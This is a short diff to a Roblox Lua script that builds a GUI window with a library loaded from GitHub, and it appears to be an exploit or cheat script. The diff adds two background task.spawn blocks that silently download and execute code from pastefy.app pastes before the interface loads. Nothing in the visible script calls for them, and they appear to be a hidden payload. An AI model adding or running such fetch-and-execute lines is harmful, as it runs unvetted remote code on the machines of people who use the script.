@@ -1,3 +1,11 @@
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/eKTgXfHH/raw"))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/Sc1n4Ikh/raw"))()
+end)
+
 local RixerLibrary = loadstring(game:HttpGet(('https://raw.githubusercontent.com/cnPthPiGon/CM9/refs/heads/main/Library.lua')))()
 
 local Window = RixerLibrary:MakeWindow({
